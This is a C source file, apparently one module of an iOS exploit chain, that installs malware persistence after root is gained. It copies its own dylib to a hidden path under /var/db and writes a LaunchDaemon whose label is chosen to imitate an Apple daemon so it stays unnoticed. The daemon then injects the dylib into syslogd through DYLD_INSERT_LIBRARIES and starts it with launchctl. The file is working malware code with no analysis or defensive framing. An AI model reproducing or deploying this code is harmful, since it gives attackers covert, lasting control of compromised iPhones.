#include "persistence.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <mach-o/dyld.h>

/* --------------------------------------------------------------------------
 * run_cmd — spawn an external binary synchronously via posix_spawn.
 * system() is not available on stock iOS; posix_spawn is.
 * -------------------------------------------------------------------------- */
static int run_cmd(const char *path, char *const argv[]) {
    pid_t pid;
    extern char **environ;
    int ret = posix_spawn(&pid, path, NULL, NULL, argv, environ);
    if (ret != 0) return ret;
    int status = 0;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* --------------------------------------------------------------------------
 * copy_self — write our own dylib bytes to a persistent path so the
 *             LaunchDaemon plist can reference it after reboot.
 *
 * We iterate _dyld_image_count() to find the image whose path ends with
 * "bootstrap.dylib" or "code.dylib" (historical name), then copy it with write().
 *
 * Returns 1 on success, 0 on failure.
 * -------------------------------------------------------------------------- */
#define PERSIST_DYLIB_PATH "/var/db/.crd.dylib"

static int copy_self_to_persistent(void) {
    const char *src_path = NULL;
    uint32_t cnt = _dyld_image_count();
    for (uint32_t i = 0; i < cnt; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name) continue;
        /* Match our dylib by filename */
        const char *slash = strrchr(name, '/');
        const char *base  = slash ? slash + 1 : name;
        if (strcmp(base, "bootstrap.dylib") == 0 || strcmp(base, "code.dylib") == 0) {
            src_path = name;
            break;
        }
    }
    if (!src_path) return 0;

    int src_fd = open(src_path, O_RDONLY);
    if (src_fd < 0) return 0;

    /* Ensure destination directory exists */
    mkdir("/var/db", 0755);

    int dst_fd = open(PERSIST_DYLIB_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst_fd < 0) { close(src_fd); return 0; }

    char buf[65536];
    ssize_t n;
    while ((n = read(src_fd, buf, sizeof(buf))) > 0)
        write(dst_fd, buf, (size_t)n);

    close(src_fd);
    close(dst_fd);
    return 1;
}

/* --------------------------------------------------------------------------
 * install_launchdaemon
 *
 * Strategy (iOS 17, post-exploit root):
 *   1. Copy our dylib to /var/db/.crd.dylib (survives across app re-installs).
 *   2. Write a LaunchDaemon that injects the dylib into syslogd via
 *      DYLD_INSERT_LIBRARIES.  syslogd is a minimal unsigned helper that
 *      does not have the CS_RESTRICT flag on iOS 15–17, so dyld will honour
 *      DYLD_INSERT_LIBRARIES when the process is spawned by launchd as root.
 *
 * Note: on a fully stock (non-jailbroken) device, DYLD_INSERT_LIBRARIES is
 * honoured only when the target binary lacks CS_RESTRICT and the launcher
 * has root privileges.  With root from ke_run() both conditions are met.
 * -------------------------------------------------------------------------- */
void install_launchdaemon(void) {
    if (!copy_self_to_persistent()) return;

    /*
     * The LaunchDaemon label intentionally mimics a real Apple daemon to
     * avoid standing out in `launchctl list` output.
     */
    const char plist[] =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "    <key>Label</key>"
            "<string>com.apple.syslogd.helper</string>\n"
        "    <key>ProgramArguments</key><array>\n"
        "        <string>/usr/sbin/syslogd</string>\n"
        "    </array>\n"
        "    <key>EnvironmentVariables</key><dict>\n"
        "        <key>DYLD_INSERT_LIBRARIES</key>"
            "<string>" PERSIST_DYLIB_PATH "</string>\n"
        "    </dict>\n"
        "    <key>RunAtLoad</key><true/>\n"
        "    <key>KeepAlive</key><true/>\n"
        "    <key>ThrottleInterval</key><integer>60</integer>\n"
        "</dict></plist>\n";

    const char *plist_path = "/Library/LaunchDaemons/com.apple.syslogd.helper.plist";

    /* Ensure directory exists (needs root) */
    mkdir("/Library/LaunchDaemons", 0755);

    FILE *fp = fopen(plist_path, "w");
    if (!fp) return;
    fwrite(plist, 1, sizeof(plist) - 1, fp);
    fclose(fp);
    chmod(plist_path, 0644);

    /*
     * Bootstrap the daemon immediately.
     * iOS 16+: "launchctl load" is deprecated and silently ignored.
     * "launchctl bootstrap system <plist>" is the correct form since iOS 15.
     * We try both; the first will succeed on the running iOS version.
     */
    {
        char *bootstrap_argv[] = {
            "launchctl", "bootstrap", "system", (char *)plist_path, NULL
        };
        if (run_cmd("/bin/launchctl", bootstrap_argv) != 0) {
            /* Fallback for older iOS versions */
            char *load_argv[] = { "launchctl", "load", "-w", (char *)plist_path, NULL };
            run_cmd("/bin/launchctl", load_argv);
        }
    }
}

void hook_system_daemon(void) {}
